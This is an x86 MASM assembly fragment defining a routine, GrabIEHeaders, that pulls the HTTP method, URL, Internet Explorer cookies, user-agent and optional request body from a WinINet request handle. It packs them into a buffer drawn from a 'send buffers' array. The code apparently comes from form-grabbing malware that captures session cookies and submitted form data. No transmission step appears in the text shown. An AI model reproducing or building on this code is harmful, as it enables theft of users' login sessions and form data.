
.code

;; ==================================================================================================== ;;
;; GrabIEHeaders -                                                                                      ;;
;; Return:  0 - failed                                                                                  ;;
;;         !0 - success                                                                                 ;;
;; ==================================================================================================== ;;
GrabIEHeaders proc uses ecx edx edi esi p1, p4, p5 : dword
	local   dwIndex : dword
	local   dwLen   : dword
	local   hParent : dword



	invokx  &ArrayKeyBuff[ebx], lpSendBuffersArray[ebx], p1
	jmpz eax, @err		;; failed to alloc buffer
	mov  esi, [eax+4]	;; ptr to data len
	lea  edi, [esi+4]	;; ptr to data start


	;; Get request method
	mov  dwLen, 8
	mov  dwIndex, 0
	invokx  _HttpQueryInfoA[ebx], p1, HTTP_QUERY_REQUEST_METHOD, edi, &dwLen, &dwIndex
	jmpz eax, @ret

	add  edi, dwLen
	mov  al, " "
	stosb


	;; Get URL
	mov  dwLen, 8192
	invokx  _InternetQueryOptionA[ebx], p1, INTERNET_OPTION_URL, edi, &dwLen
	jmpz eax, @ret


	;; Attach Cookie
	mov  edx, edi		;; pointer to url
	add  edi, dwLen
	add  edi, 10		;; reserve space for "\r\nCookie: " string
	mov  dwLen, 8192
	invokx  _InternetGetCookieA[ebx], edx, 0, edi, &dwLen
	sub  edi, 10
	jmpz eax, @F

	mov  ax, 0A0Dh
	stosw
	mov  eax, "kooC"
	stosd
	mov  eax, " :ei"
	stosd
	add  edi, dwLen
	dec  edi			;; exclude nullbyte


	;; Attach User-Agent
@@:	mov  dwLen, 4
	invokx  _InternetQueryOptionA[ebx], p1, INTERNET_OPTION_PARENT_HANDLE, &hParent, &dwLen
	jmpz eax, @F
	mov  dwLen, 4
	invokx  _InternetQueryOptionA[ebx], hParent, INTERNET_OPTION_PARENT_HANDLE, &hParent, &dwLen
	jmpz eax, @F
	add  edi, 14		;; reserve space for "\r\nUser-Agent: " string
	mov  dwLen, 260
	invokx  _InternetQueryOptionA[ebx], hParent, INTERNET_OPTION_USER_AGENT, edi, &dwLen
	sub  edi, 14
	jmpz eax, @F

	mov  ax, 0A0Dh
	stosw
	mov  eax, "resU"
	stosd
	mov  eax, "egA-"
	stosd
	mov  eax, " :tn"
	stosd
	add  edi, dwLen


	;; Attach optional data
@@:	cmp  p5, 0
	je   @F
	mov  eax, 0A0D0A0Dh
	stosd
	invokx  &strcpyn[ebx], edi, p4, p5
	add  edi, p5


	;; Len
@@:	sub  edi, esi
	sub  edi, 4
	mov  [esi], edi


@ret:
	mov  eax, esi

@err:
	ret
GrabIEHeaders endp

